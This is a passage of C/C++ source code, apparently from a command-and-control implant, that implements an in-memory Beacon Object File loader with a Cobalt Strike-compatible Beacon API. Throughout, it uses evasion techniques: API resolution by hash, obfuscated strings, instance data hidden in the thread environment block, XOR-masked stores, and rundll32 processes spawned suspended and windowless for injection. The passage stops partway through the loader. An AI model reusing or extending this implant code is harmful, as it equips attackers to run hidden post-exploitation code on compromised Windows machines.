#include "config.h"

#if defined(INCLUDE_CMD_INLINE_EXECUTE) || (SLEEP_MASK_TYPE == MASK_UDRL)

#include "common.h"
#include "coff.h"
#include "parser.h"
#include "package.h"
#include "crypto.h"

// ─── Instance stash via TEB.ArbitraryUserPointer (gs:[0x28]) ───

static inline void coff_set_inst(PINSTANCE p) {
#ifdef _WIN64
    register void* val __asm__("rcx") = (void*)p;
    __asm__ volatile (
        ".byte 0x65, 0x48, 0x89, 0x0c, 0x25, 0x28, 0x00, 0x00, 0x00"
        :: "c"(val) : "memory"
    );
#endif
}

static inline PINSTANCE coff_get_inst() {
#ifdef _WIN64
    void* result;
    __asm__ volatile (
        ".byte 0x65, 0x48, 0x8b, 0x04, 0x25, 0x28, 0x00, 0x00, 0x00"
        : "=a"(result)
    );
    return (PINSTANCE)result;
#else
    return NULL;
#endif
}

// ─── BOF output buffer helpers ───

static void bof_output_append(PINSTANCE inst, const char* data, int len) {
    if (!inst || !data || len <= 0) return;

    if (inst->BofOutputLen + (DWORD)len + 2 > inst->BofOutputCap) {
        DWORD new_cap = inst->BofOutputCap == 0 ? 4096 : inst->BofOutputCap;
        while (new_cap < inst->BofOutputLen + (DWORD)len + 2) new_cap *= 2;
        inst->BofOutput = (char*)es_realloc(inst, inst->BofOutput, new_cap);
        inst->BofOutputCap = new_cap;
    }

    es_memcpy(inst->BofOutput + inst->BofOutputLen, (PVOID)data, len);
    inst->BofOutputLen += len;
    inst->BofOutput[inst->BofOutputLen] = '\0';
}

// ─── Beacon API implementations for BOFs ───

extern "C" {

static void __cdecl beacon_printf(int type, const char* fmt, ...) {
    (void)type;
    PINSTANCE inst = coff_get_inst();
    if (!inst || !fmt) return;

    // Resolve _vsnprintf from ntdll
    typedef int (__cdecl *fn_vsnprintf)(char*, size_t, const char*, va_list);
    fn_vsnprintf p_vsnprintf = (fn_vsnprintf)resolve_function(
        inst->Modules.Ntdll, hash_string_djb2("_vsnprintf"));

    char buf[2048];
    int len;

    if (p_vsnprintf) {
        va_list args;
        va_start(args, fmt);
        len = p_vsnprintf(buf, sizeof(buf) - 1, fmt, args);
        va_end(args);
        if (len < 0) len = sizeof(buf) - 1;
        buf[len] = '\0';
    } else {
        len = 0;
        const char* s = fmt;
        while (*s && len < (int)sizeof(buf) - 1) buf[len++] = *s++;
        buf[len] = '\0';
    }

    bof_output_append(inst, buf, len);
}

static void __cdecl beacon_output(int type, const char* data, int len) {
    (void)type;
    PINSTANCE inst = coff_get_inst();
    if (!inst || !data || len <= 0) return;
    bof_output_append(inst, data, len);
}

// ─── Data API ───

typedef struct _bof_datap {
    char* original;
    char* buffer;
    int   length;
    int   size;
} bof_datap;

static void __cdecl beacon_data_parse(bof_datap* dp, char* buf, int size) {
    dp->original = buf;
    dp->buffer = buf;
    dp->length = size;
    dp->size = size;
}

static int __cdecl beacon_data_int(bof_datap* dp) {
    if (dp->length < 4) return 0;
    int val = *(int*)dp->buffer;
    dp->buffer += 4;
    dp->length -= 4;
    return val;
}

static short __cdecl beacon_data_short(bof_datap* dp) {
    if (dp->length < 2) return 0;
    short val = *(short*)dp->buffer;
    dp->buffer += 2;
    dp->length -= 2;
    return val;
}

static char* __cdecl beacon_data_extract(bof_datap* dp, int* out_len) {
    if (dp->length < 4) { if (out_len) *out_len = 0; return NULL; }
    int len = *(int*)dp->buffer;
    dp->buffer += 4;
    dp->length -= 4;
    if (dp->length < len) { if (out_len) *out_len = 0; return NULL; }
    char* result = dp->buffer;
    dp->buffer += len;
    dp->length -= len;
    if (out_len) *out_len = len;
    return result;
}

static int __cdecl beacon_data_length(bof_datap* dp) {
    return dp->length;
}

static char* __cdecl beacon_data_ptr(bof_datap* dp, int size) {
    if (!dp || dp->length < size) return NULL;
    char* result = dp->buffer;
    dp->buffer += size;
    dp->length -= size;
    return result;
}

// ─── Format API ───

typedef struct _bof_formatp {
    char* original;
    char* buffer;
    int   length;
    int   size;
} bof_formatp;

static void __cdecl beacon_format_alloc(bof_formatp* fp, int maxsz) {
    PINSTANCE inst = coff_get_inst();
    if (inst) {
        fp->original = (char*)es_malloc(inst, maxsz);
        fp->buffer = fp->original;
        fp->length = 0;
        fp->size = maxsz;
    }
}

static void __cdecl beacon_format_reset(bof_formatp* fp) {
    fp->buffer = fp->original;
    fp->length = 0;
}

static void __cdecl beacon_format_free(bof_formatp* fp) {
    PINSTANCE inst = coff_get_inst();
    if (inst && fp->original) {
        es_free(inst, fp->original);
        fp->original = NULL;
        fp->buffer = NULL;
    }
}

static void __cdecl beacon_format_append(bof_formatp* fp, const char* buf, int len) {
    if (fp->length + len <= fp->size) {
        es_memcpy(fp->buffer + fp->length, (PVOID)buf, len);
        fp->length += len;
    }
}

static void __cdecl beacon_format_printf(bof_formatp* fp, const char* fmt, ...) {
    PINSTANCE inst = coff_get_inst();
    if (!inst || !fp || !fmt) return;

    typedef int (__cdecl *fn_vsnprintf)(char*, size_t, const char*, va_list);
    fn_vsnprintf p_vsnprintf = (fn_vsnprintf)resolve_function(
        inst->Modules.Ntdll, 0xc33577f5);
    if (!p_vsnprintf) return;

    int avail = fp->size - fp->length;
    if (avail <= 0) return;

    va_list args;
    va_start(args, fmt);
    int written = p_vsnprintf(fp->buffer + fp->length, avail, fmt, args);
    va_end(args);
    if (written > 0) fp->length += written;
}

static char* __cdecl beacon_format_tostring(bof_formatp* fp, int* size) {
    if (size) *size = fp->length;
    return fp->original;
}

static void __cdecl beacon_format_int(bof_formatp* fp, int val) {
    beacon_format_append(fp, (char*)&val, 4);
}

// ─── Token stubs ───

static BOOL __cdecl beacon_use_token(HANDLE token) {
    (void)token;
    return FALSE;
}

static void __cdecl beacon_revert_token() {}

// ─── Spawn/Inject ───

static void __cdecl beacon_inject_process(HANDLE h, int pid, char* p, int pl, int po, char* a, int al) {
    (void)h; (void)pid; (void)p; (void)pl; (void)po; (void)a; (void)al;
}

static void __cdecl beacon_inject_temp_process(PROCESS_INFORMATION* pi, char* p, int pl, int po, char* a, int al) {
    (void)pi; (void)p; (void)pl; (void)po; (void)a; (void)al;
}

static BOOL __cdecl beacon_spawn_temp_process(BOOL x86, BOOL ig, STARTUPINFOA* si, PROCESS_INFORMATION* pi) {
    PINSTANCE inst = coff_get_inst();
    if (!inst || !si || !pi) return FALSE;

    char* app_path = x86 ? inst->Spawnto.x86 : inst->Spawnto.x64;
    char* app_args = x86 ? inst->Spawnto.x86_args : inst->Spawnto.x64_args;

    if (!app_path[0]) return FALSE;

    char cmdline_a[600];
    es_memset(cmdline_a, 0, sizeof(cmdline_a));
    es_strcpy(cmdline_a, app_path);
    if (app_args[0]) {
        int cl = es_strlen(cmdline_a);
        cmdline_a[cl] = ' ';
        es_strcpy(cmdline_a + cl + 1, app_args);
    }

    wchar_t cmdline_w[300];
    es_memset(cmdline_w, 0, sizeof(cmdline_w));
    inst->Win32.MultiByteToWideChar(0, 0, cmdline_a, -1, cmdline_w, 300);

    STARTUPINFOW siw;
    es_memset(&siw, 0, sizeof(siw));
    siw.cb          = sizeof(STARTUPINFOW);
    siw.dwFlags     = si->dwFlags ? si->dwFlags : 0x101;
    siw.wShowWindow = si->wShowWindow;

    return inst->Win32.CreateProcessW(
        NULL, cmdline_w, NULL, NULL, ig ? TRUE : FALSE,
        0x04 | 0x08000000, NULL, NULL, &siw, pi);
}

// ─── Utility ───

static BOOL __cdecl beacon_is_admin() { return FALSE; }

static void __cdecl beacon_cleanup_process(void* ctx) { (void)ctx; }

static BOOL __cdecl beacon_to_wide_char(char* src, wchar_t* dst, int max) {
    PINSTANCE inst = coff_get_inst();
    if (!inst || !src || !dst || max <= 0) return FALSE;
    int result = inst->Win32.MultiByteToWideChar(0, 0, src, -1, dst, max);
    return result > 0 ? TRUE : FALSE;
}

static DWORD __cdecl beacon_get_spawn_to(BOOL x86, char* buf, int len) {
    if (!buf || len <= 0) return 0;
    PINSTANCE inst = coff_get_inst();
    const char* src = NULL;
    if (inst)
        src = x86 ? inst->Spawnto.x86 : inst->Spawnto.x64;
    if (!src || !src[0]) {
        xstr(_def, "rundll32.exe");
        src = _def;
    }
    int i = 0;
    while (src[i] && i < len - 1) { buf[i] = src[i]; i++; }
    buf[i] = '\0';
    return (DWORD)i;
}

static BOOL __cdecl beacon_download(const char* filename, const char* buffer, unsigned int length) {
    (void)filename; (void)buffer; (void)length;
    return TRUE;
}

// ─── BeaconInformation ───

static BOOL __cdecl beacon_information(BEACON_INFO* info) {
    PINSTANCE inst = coff_get_inst();
    if (!inst || !info) return FALSE;
    es_memset(info, 0, sizeof(BEACON_INFO));
    info->version = ES_VERSION;
    info->beacon_ptr = (char*)inst->Base.Buffer;
    DWORD seed = 0x12345678;
    for (int i = 0; i < MASK_SIZE; i++) {
        seed = seed * 1103515245 + 12345;
        info->mask[i] = (char)(seed >> 16);
    }
    return TRUE;
}

// ─── Key/Value store ───

static DWORD kv_hash(const char* key) {
    DWORD h = 0x811c9dc5;
    while (*key) { h ^= (BYTE)*key++; h *= 0x01000193; }
    return h;
}

static BOOL __cdecl beacon_add_value(const char* key, void* ptr) {
    PINSTANCE inst = coff_get_inst();
    if (!inst || !key) return FALSE;
    DWORD h = kv_hash(key);
    for (DWORD i = 0; i < inst->KvCount; i++) {
        if (inst->KvStore[i].hash == h) {
            inst->KvStore[i].ptr = ptr;
            return TRUE;
        }
    }
    if (inst->KvCount >= 64) return FALSE;
    inst->KvStore[inst->KvCount].hash = h;
    inst->KvStore[inst->KvCount].ptr = ptr;
    inst->KvCount++;
    return TRUE;
}

static void* __cdecl beacon_get_value(const char* key) {
    PINSTANCE inst = coff_get_inst();
    if (!inst || !key) return NULL;
    DWORD h = kv_hash(key);
    for (DWORD i = 0; i < inst->KvCount; i++) {
        if (inst->KvStore[i].hash == h)
            return inst->KvStore[i].ptr;
    }
    return NULL;
}

static BOOL __cdecl beacon_remove_value(const char* key) {
    PINSTANCE inst = coff_get_inst();
    if (!inst || !key) return FALSE;
    DWORD h = kv_hash(key);
    for (DWORD i = 0; i < inst->KvCount; i++) {
        if (inst->KvStore[i].hash == h) {
            for (DWORD j = i; j + 1 < inst->KvCount; j++)
                inst->KvStore[j] = inst->KvStore[j + 1];
            inst->KvCount--;
            return TRUE;
        }
    }
    return FALSE;
}

// ─── Data Store stubs ───

static DATA_STORE_OBJECT* __cdecl beacon_data_store_get_item(size_t idx) {
    PINSTANCE inst = coff_get_inst();
    if (!inst || idx >= inst->DataStoreCount) return NULL;
    return &inst->DataStore[idx];
}

static void __cdecl beacon_data_store_protect_item(size_t idx) {
    PINSTANCE inst = coff_get_inst();
    if (!inst || idx >= inst->DataStoreCount) return;
    if (!inst->DataStore[idx].masked && inst->DataStore[idx].buffer) {
        BYTE mask_key = 0x41;
        xor_bytes((BYTE*)inst->DataStore[idx].buffer,
                  (DWORD)inst->DataStore[idx].length, &mask_key, 1);
        inst->DataStore[idx].masked = TRUE;
    }
}

static void __cdecl beacon_data_store_unprotect_item(size_t idx) {
    PINSTANCE inst = coff_get_inst();
    if (!inst || idx >= inst->DataStoreCount) return;
    if (inst->DataStore[idx].masked && inst->DataStore[idx].buffer) {
        BYTE mask_key = 0x41;
        xor_bytes((BYTE*)inst->DataStore[idx].buffer,
                  (DWORD)inst->DataStore[idx].length, &mask_key, 1);
        inst->DataStore[idx].masked = FALSE;
    }
}

static size_t __cdecl beacon_data_store_max_entries() { return 16; }

// ─── Custom User Data ───

static char* __cdecl beacon_get_custom_user_data() {
    PINSTANCE inst = coff_get_inst();
    if (!inst || !inst->pUserData) return NULL;
    return inst->pUserData->custom;
}

// ─── Syscall Information ───

static BOOL __cdecl beacon_get_syscall_info(BEACON_SYSCALLS* info, SIZE_T infoSize, BOOL resolve) {
    (void)resolve;
    if (!info || infoSize < sizeof(BEACON_SYSCALLS)) return FALSE;
    es_memset(info, 0, sizeof(BEACON_SYSCALLS));
    return TRUE;
}

// ─── VirtualAlloc/Protect/Free pass-throughs ───

static LPVOID __cdecl beacon_virtual_alloc(LPVOID addr, SIZE_T size, DWORD type, DWORD prot) {
    PINSTANCE inst = coff_get_inst();
    return inst ? gate_VirtualAlloc(inst, addr, size, type, prot) : NULL;
}

static BOOL __cdecl beacon_virtual_protect(LPVOID addr, SIZE_T size, DWORD prot, PDWORD old) {
    PINSTANCE inst = coff_get_inst();
    return inst ? gate_VirtualProtect(inst, addr, size, prot, old) : FALSE;
}

static BOOL __cdecl beacon_virtual_free(LPVOID addr, SIZE_T size, DWORD type) {
    PINSTANCE inst = coff_get_inst();
    return inst ? gate_VirtualFree(inst, addr, size, type) : FALSE;
}

static HANDLE __cdecl beacon_open_process(DWORD access, BOOL inherit, DWORD pid) {
    PINSTANCE inst = coff_get_inst();
    return inst ? gate_OpenProcess(inst, access, inherit, pid) : NULL;
}

static BOOL __cdecl beacon_close_handle(HANDLE h) {
    PINSTANCE inst = coff_get_inst();
    return inst ? gate_CloseHandle(inst, h) : FALSE;
}

// Gate toggles - route to real implementation via INSTANCE
static void __cdecl beacon_disable_gate() {
    PINSTANCE inst = coff_get_inst();
    if (inst) inst->bBeaconGateEnabled = FALSE;
}
static void __cdecl beacon_enable_gate() {
    PINSTANCE inst = coff_get_inst();
    if (inst) inst->bBeaconGateEnabled = TRUE;
}
static void __cdecl beacon_disable_masking() {
    PINSTANCE inst = coff_get_inst();
    if (inst) inst->bBeaconGateMasking = FALSE;
}
static void __cdecl beacon_enable_masking() {
    PINSTANCE inst = coff_get_inst();
    if (inst) inst->bBeaconGateMasking = TRUE;
}

} // extern "C"

// ─── FNV-1a hash (compile-time constexpr and runtime) ───

static constexpr DWORD _fnv1a(const char* s) {
    DWORD h = 0x811c9dc5;
    while (*s) { h ^= (BYTE)*s++; h *= 0x01000193; }
    return h;
}

static DWORD fnv1a_runtime(const char* s) {
    DWORD h = 0x811c9dc5;
    while (*s) { h ^= (BYTE)*s++; h *= 0x01000193; }
    return h;
}

// ─── Symbol resolution: Beacon API + DFR (MODULE$Function) ───

static void* resolve_coff_symbol(PINSTANCE inst, const char* name) {
    DWORD h = fnv1a_runtime(name);

    switch (h) {
        // Data API
        case _fnv1a("BeaconDataParse"):     return (void*)beacon_data_parse;
        case _fnv1a("BeaconDataInt"):       return (void*)beacon_data_int;
        case _fnv1a("BeaconDataShort"):     return (void*)beacon_data_short;
        case _fnv1a("BeaconDataExtract"):   return (void*)beacon_data_extract;
        case _fnv1a("BeaconDataLength"):    return (void*)beacon_data_length;
        case _fnv1a("BeaconDataPtr"):       return (void*)beacon_data_ptr;

        // Format API
        case _fnv1a("BeaconFormatAlloc"):   return (void*)beacon_format_alloc;
        case _fnv1a("BeaconFormatReset"):   return (void*)beacon_format_reset;
        case _fnv1a("BeaconFormatFree"):    return (void*)beacon_format_free;
        case _fnv1a("BeaconFormatAppend"):  return (void*)beacon_format_append;
        case _fnv1a("BeaconFormatPrintf"):  return (void*)beacon_format_printf;
        case _fnv1a("BeaconFormatToString"):return (void*)beacon_format_tostring;
        case _fnv1a("BeaconFormatInt"):     return (void*)beacon_format_int;

        // Output
        case _fnv1a("BeaconPrintf"):        return (void*)beacon_printf;
        case _fnv1a("BeaconOutput"):        return (void*)beacon_output;

        // Token
        case _fnv1a("BeaconUseToken"):      return (void*)beacon_use_token;
        case _fnv1a("BeaconRevertToken"):   return (void*)beacon_revert_token;

        // Spawn/Inject
        case _fnv1a("BeaconInjectProcess"):          return (void*)beacon_inject_process;
        case _fnv1a("BeaconInjectTemporaryProcess"): return (void*)beacon_inject_temp_process;
        case _fnv1a("BeaconSpawnTemporaryProcess"):  return (void*)beacon_spawn_temp_process;
        case _fnv1a("BeaconCleanupProcess"):         return (void*)beacon_cleanup_process;
        case _fnv1a("BeaconGetSpawnTo"):             return (void*)beacon_get_spawn_to;

        // Utility
        case _fnv1a("BeaconIsAdmin"):       return (void*)beacon_is_admin;
        case _fnv1a("toWideChar"):          return (void*)beacon_to_wide_char;
        case _fnv1a("BeaconDownload"):      return (void*)beacon_download;

        // Information
        case _fnv1a("BeaconInformation"):   return (void*)beacon_information;

        // K/V Store
        case _fnv1a("BeaconAddValue"):      return (void*)beacon_add_value;
        case _fnv1a("BeaconGetValue"):      return (void*)beacon_get_value;
        case _fnv1a("BeaconRemoveValue"):   return (void*)beacon_remove_value;

        // Data Store
        case _fnv1a("BeaconDataStoreGetItem"):       return (void*)beacon_data_store_get_item;
        case _fnv1a("BeaconDataStoreProtectItem"):   return (void*)beacon_data_store_protect_item;
        case _fnv1a("BeaconDataStoreUnprotectItem"): return (void*)beacon_data_store_unprotect_item;
        case _fnv1a("BeaconDataStoreMaxEntries"):    return (void*)beacon_data_store_max_entries;

        // Custom User Data
        case _fnv1a("BeaconGetCustomUserData"):      return (void*)beacon_get_custom_user_data;

        // Syscall Info
        case _fnv1a("BeaconGetSyscallInformation"):  return (void*)beacon_get_syscall_info;

        // VirtualAlloc/Protect/Free wrappers
        case _fnv1a("BeaconVirtualAlloc"):   return (void*)beacon_virtual_alloc;
        case _fnv1a("BeaconVirtualProtect"): return (void*)beacon_virtual_protect;
        case _fnv1a("BeaconVirtualFree"):    return (void*)beacon_virtual_free;
        case _fnv1a("BeaconOpenProcess"):    return (void*)beacon_open_process;
        case _fnv1a("BeaconCloseHandle"):    return (void*)beacon_close_handle;

        // Gate toggles
        case _fnv1a("BeaconDisableBeaconGate"):  return (void*)beacon_disable_gate;
        case _fnv1a("BeaconEnableBeaconGate"):   return (void*)beacon_enable_gate;
        case _fnv1a("BeaconDisableBeaconGateMasking"): return (void*)beacon_disable_masking;
        case _fnv1a("BeaconEnableBeaconGateMasking"):  return (void*)beacon_enable_masking;

        // Win32 APIs that BOFs call directly
        case _fnv1a("GetProcAddress"):  return (void*)inst->Win32.GetProcAddress;
        case _fnv1a("LoadLibraryA"):    return (void*)inst->Win32.LoadLibraryA;
        case _fnv1a("GetModuleHandleA"): {
            xstr(_gmha, "GetModuleHandleA");
            return (void*)inst->Win32.GetProcAddress(
                (HMODULE)inst->Modules.Kernel32, _gmha);
        }
        case _fnv1a("FreeLibrary"): {
            xstr(_fl, "FreeLibrary");
            return (void*)inst->Win32.GetProcAddress(
                (HMODULE)inst->Modules.Kernel32, _fl);
        }

        // SEH handler
        case _fnv1a("__C_specific_handler"): {
            xstr(_csh, "__C_specific_handler");
            void* p = (void*)inst->Win32.GetProcAddress(
                (HMODULE)inst->Modules.Ntdll, _csh);
            if (!p) p = (void*)inst->Win32.GetProcAddress(
                (HMODULE)inst->Modules.Kernel32, _csh);
            return p;
        }
    }

    // Strip __imp_ prefix and recurse
    if (name[0] == '_' && name[1] == '_' && name[2] == 'i' &&
        name[3] == 'm' && name[4] == 'p' && name[5] == '_') {
        return resolve_coff_symbol(inst, name + 6);
    }

    // DFR: MODULE$Function → LoadLibraryA("MODULE.dll") + GetProcAddress
    const char* dollar = name;
    while (*dollar && *dollar != '$') dollar++;

    if (*dollar == '$') {
        char mod_name[64] = {0};
        char func_name[128] = {0};

        DWORD mod_len = (DWORD)(dollar - name);
        if (mod_len < 59) {
            es_memcpy(mod_name, (PVOID)name, mod_len);
            mod_name[mod_len] = '.'; mod_name[mod_len+1] = 'd';
            mod_name[mod_len+2] = 'l'; mod_name[mod_len+3] = 'l';
            mod_name[mod_len+4] = '\0';
        }

        const char* fn = dollar + 1;
        int fi = 0;
        while (*fn && *fn != '@' && fi < 127) func_name[fi++] = *fn++;

        HMODULE hMod = inst->Win32.LoadLibraryA(mod_name);
        if (hMod) {
            FARPROC addr = inst->Win32.GetProcAddress(hMod, func_name);
            if (addr) return (void*)addr;
            if (inst->Win32.OutputDebugStringA) {
                inst->Win32.OutputDebugStringA("[BOF] DFR GetProcAddress FAILED:");
                inst->Win32.OutputDebugStringA(func_name);
            }
        } else if (inst->Win32.OutputDebugStringA) {
            inst->Win32.OutputDebugStringA("[BOF] DFR LoadLibraryA FAILED:");
            inst->Win32.OutputDebugStringA(mod_name);
        }
    }

    return NULL;
}

// ─── VEH crash handler for BOF isolation ───

typedef struct _BOF_CRASH_STATE {
    PINSTANCE inst;
    DWORD     thread_id;
    int       guard_active;
    DWORD     crash_code;
    ULONG_PTR exit_thread_addr;
} BOF_CRASH_STATE;

static BOF_CRASH_STATE g_bof_crash = {0};

static inline DWORD get_current_tid() {
#ifdef _WIN64
    DWORD tid;
    __asm__ volatile (
        ".byte 0x65, 0x8b, 0x04, 0x25, 0x48, 0x00, 0x00, 0x00"
        : "=a"(tid)
    );
    return tid;
#else
    DWORD tid;
    __asm__ volatile (
        ".byte 0x64, 0x8b, 0x04, 0x25, 0x24, 0x00, 0x00, 0x00"
        : "=a"(tid)
    );
    return tid;
#endif
}

static LONG WINAPI bof_crash_handler(EXCEPTION_POINTERS* ep) {
    if (!g_bof_crash.guard_active)
        return EXCEPTION_CONTINUE_SEARCH;

    if (get_current_tid() != g_bof_crash.thread_id)
        return EXCEPTION_CONTINUE_SEARCH;

    g_bof_crash.crash_code = ep->ExceptionRecord->ExceptionCode;
    g_bof_crash.guard_active = 0;

#ifdef _WIN64
    ep->ContextRecord->Rcx = ep->ExceptionRecord->ExceptionCode;
    ep->ContextRecord->Rip = g_bof_crash.exit_thread_addr;
    ep->ContextRecord->Rsp &= ~0xFull;
    ep->ContextRecord->Rsp -= 8;
#else
    ep->ContextRecord->Esp -= 4;
    *(DWORD*)ep->ContextRecord->Esp = ep->ExceptionRecord->ExceptionCode;
    ep->ContextRecord->Eip = (DWORD)g_bof_crash.exit_thread_addr;
#endif

    return EXCEPTION_CONTINUE_EXECUTION;
}

// ─── BOF debug helpers ───

static void bof_dbg_fn(PINSTANCE inst, const char* name, void* addr) {
    if (!inst || !inst->Win32.OutputDebugStringA || !addr) return;
    BYTE* code = (BYTE*)addr;
    char buf[128] = "[BOF] fn:";
    const char* hex = "0123456789abcdef";
    int p = 9;
    while (*name && p < 45) buf[p++] = *name++;
    buf[p++] = ' '; buf[p++] = '@';
    ULONG_PTR v = (ULONG_PTR)addr;
    for (int s = 60; s >= 0; s -= 4) buf[p++] = hex[(v >> s) & 0xF];
    buf[p++] = ' '; buf[p++] = '[';
    for (int b = 0; b < 4; b++) {
        buf[p++] = hex[(code[b] >> 4) & 0xF];
        buf[p++] = hex[code[b] & 0xF];
        if (b < 3) buf[p++] = ' ';
    }
    buf[p++] = ']'; buf[p] = '\0';
    inst->Win32.OutputDebugStringA(buf);
}

static void bof_dbg_hex(PINSTANCE inst, const char* label, ULONG_PTR val) {
    if (!inst || !inst->Win32.OutputDebugStringA) return;
    char buf[80];
    const char* hex = "0123456789abcdef";
    int p = 0;
    while (*label && p < 45) buf[p++] = *label++;
    for (int s = 60; s >= 0; s -= 4) buf[p++] = hex[(val >> s) & 0xF];
    buf[p] = '\0';
    inst->Win32.OutputDebugStringA(buf);
}

static void bof_dbg_sym(PINSTANCE inst, const char* name, void* addr) {
    if (!inst || !inst->Win32.OutputDebugStringA) return;
    char buf[128] = "[BOF] resolve:";
    const char* hex = "0123456789abcdef";
    int p = 14;
    while (*name && p < 65) buf[p++] = *name++;
    buf[p++] = '=';
    if (!addr) { buf[p++]='N'; buf[p++]='U'; buf[p++]='L'; buf[p++]='L'; }
    else {
        ULONG_PTR v = (ULONG_PTR)addr;
        for (int s = 60; s >= 0; s -= 4) buf[p++] = hex[(v >> s) & 0xF];
    }
    buf[p] = '\0';
    inst->Win32.OutputDebugStringA(buf);
}

// ─── BOF thread wrapper ───

typedef struct _BOF_RUN_CTX {
    void*      entry;
    char*      args;
    int        args_len;
    PINSTANCE  inst;
} BOF_RUN_CTX;

static DWORD WINAPI bof_thread_fn(LPVOID param) {
    BOF_RUN_CTX* ctx = (BOF_RUN_CTX*)param;
    coff_set_inst(ctx->inst);
    g_bof_crash.thread_id = get_current_tid();
    g_bof_crash.guard_active = 1;

    typedef void (__cdecl *bof_entry_t)(char*, int);
    bof_entry_t fn = (bof_entry_t)ctx->entry;
    fn(ctx->args, ctx->args_len);

    g_bof_crash.guard_active = 0;
    return 0;
}

#ifdef INCLUDE_CMD_INLINE_EXECUTE
// ─── Main BOF execution engine ───

BOOL bof_execute(PINSTANCE inst, BYTE* coff_data, DWORD coff_size,
                 BYTE* arg_data, DWORD arg_size,
                 char** output, DWORD* output_len)
{
    if (coff_size < sizeof(COFF_FILE_HEADER))
        return FALSE;

    PCOFF_FILE_HEADER header = (PCOFF_FILE_HEADER)coff_data;
    PCOFF_SECTION sections = (PCOFF_SECTION)(coff_data + sizeof(COFF_FILE_HEADER) + header->SizeOfOptionalHeader);
    PCOFF_SYMBOL symbols = (PCOFF_SYMBOL)(coff_data + header->PointerToSymbolTable);
    char* string_table = (char*)(symbols + header->NumberOfSymbols);

    WORD num_sections = header->NumberOfSections;
    DWORD num_symbols = header->NumberOfSymbols;

    // Allocate section pointer array
    BYTE** section_ptrs = (BYTE**)es_malloc(inst, num_sections * sizeof(BYTE*));
    if (!section_ptrs) return FALSE;

    // Calculate total allocation: sections + trampolines + IAT
    DWORD total_alloc = 0;
    DWORD sec_offsets[256] = {0};
    DWORD sec_sizes[256] = {0};

    for (WORD i = 0; i < num_sections && i < 256; i++) {
        sec_sizes[i] = sections[i].SizeOfRawData;
        if (sec_sizes[i] == 0) sec_sizes[i] = sections[i].VirtualSize;
        if (sec_sizes[i] == 0) sec_sizes[i] = 64;

        // Page-align boundary between executable and non-executable sections
        if (i > 0 && (sections[i-1].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
            !(sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)) {
            total_alloc = (total_alloc + 0xFFF) & ~0xFFFu;
        }

        sec_offsets[i] = total_alloc;
        total_alloc += (sec_sizes[i] + 15) & ~15u;
    }

    total_alloc = (total_alloc + 0xFFF) & ~0xFFFu;
    DWORD tramp_offset = total_alloc;
    total_alloc += num_symbols * 12;
    DWORD imp_offset = (total_alloc + 7) & ~7u;
    total_alloc = imp_offset + num_symbols * sizeof(void*);

    // Calculate space for COMMON symbols (globals: SectionNumber=0, Value>0)
    DWORD common_offset = (total_alloc + 7) & ~7u;
    DWORD common_total = 0;
    for (DWORD cs = 0; cs < num_symbols; cs++) {
        if (symbols[cs].SectionNumber == 0 &&
            symbols[cs].StorageClass == IMAGE_SYM_CLASS_EXTERNAL &&
            symbols[cs].Value > 0) {
            common_total = (common_total + 7) & ~7u;
            common_total += symbols[cs].Value;
        }
        cs += symbols[cs].NumberOfAuxSymbols;
    }
    total_alloc = common_offset + common_total;

    // Allocate single RW block for all sections + trampolines + IAT + COMMON
    BYTE* coff_base = (BYTE*)gate_VirtualAlloc(inst,
        NULL, total_alloc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!coff_base) {
        es_free(inst, section_ptrs);
        return FALSE;
    }

    // Copy section data
    for (WORD i = 0; i < num_sections; i++) {
        section_ptrs[i] = coff_base + sec_offsets[i];
        if (sections[i].SizeOfRawData > 0) {
            es_memcpy(section_ptrs[i],
                      coff_data + sections[i].PointerToRawData,
                      sections[i].SizeOfRawData);
        }
    }

    BYTE* tramp_ptr = coff_base + tramp_offset;
    DWORD tramp_used = 0;
    void** imp_table = (void**)(coff_base + imp_offset);
    DWORD common_cursor = 0;

    // Resolve symbols
    void** func_ptrs = (void**)es_malloc(inst, num_symbols * sizeof(void*));
    if (!func_ptrs) {
        gate_VirtualFree(inst, coff_base, 0, MEM_RELEASE);
        es_free(inst, section_ptrs);
        return FALSE;
    }
    es_memset(func_ptrs, 0, num_symbols * sizeof(void*));

    void* entry_ptr = NULL;

    for (DWORD i = 0; i < num_symbols; i++) {
        char sym_name[256] = {0};
        if (symbols[i].Name.LongName.Zeros == 0) {
            char* long_name = string_table + symbols[i].Name.LongName.Offset;
            int nlen = es_strlen(long_name);
            es_memcpy(sym_name, long_name, nlen < 255 ? nlen : 255);
        } else {
            es_memcpy(sym_name, symbols[i].Name.ShortName, 8);
        }

        if (symbols[i].SectionNumber > 0) {
            WORD sec_idx = symbols[i].SectionNumber - 1;
            func_ptrs[i] = section_ptrs[sec_idx] + symbols[i].Value;

            // Check for "go" or "_go" entry point
            if ((sym_name[0] == 'g' && sym_name[1] == 'o' && sym_name[2] == '\0') ||
                (sym_name[0] == '_' && sym_name[1] == 'g' && sym_name[2] == 'o' && sym_name[3] == '\0')) {
                entry_ptr = func_ptrs[i];
            }
        } else if (symbols[i].SectionNumber == 0 &&
                   symbols[i].StorageClass == IMAGE_SYM_CLASS_EXTERNAL) {
            BOOL is_imp = (sym_name[0] == '_' && sym_name[1] == '_' &&
                          sym_name[2] == 'i' && sym_name[3] == 'm' &&
                          sym_name[4] == 'p' && sym_name[5] == '_');

            if (!is_imp && symbols[i].Value > 0) {
                common_cursor = (common_cursor + 7) & ~7u;
                func_ptrs[i] = coff_base + common_offset + common_cursor;
                common_cursor += symbols[i].Value;
            } else {
                void* resolved = resolve_coff_symbol(inst, sym_name);
                bof_dbg_sym(inst, sym_name, resolved);
                if (is_imp && resolved) {
                    imp_table[i] = resolved;
                    func_ptrs[i] = &imp_table[i];
                } else if (resolved) {
                    BYTE* t = tramp_ptr + tramp_used * 12;
                    t[0] = 0x48; t[1] = 0xB8;
                    *(UINT64*)(t + 2) = (UINT64)resolved;
                    t[10] = 0xFF; t[11] = 0xE0;
                    func_ptrs[i] = t;
                    tramp_used++;
                    bof_dbg_hex(inst, "[BOF] tramp->", (ULONG_PTR)resolved);
                }
            }
        }

        i += symbols[i].NumberOfAuxSymbols;
    }

    if (!entry_ptr) {
        if (inst->Win32.OutputDebugStringA)
            inst->Win32.OutputDebugStringA("[BOF] no entry point found!");
        gate_VirtualFree(inst, coff_base, 0, MEM_RELEASE);
        es_free(inst, section_ptrs);
        es_free(inst, func_ptrs);
        return FALSE;
    }

    // Process relocations
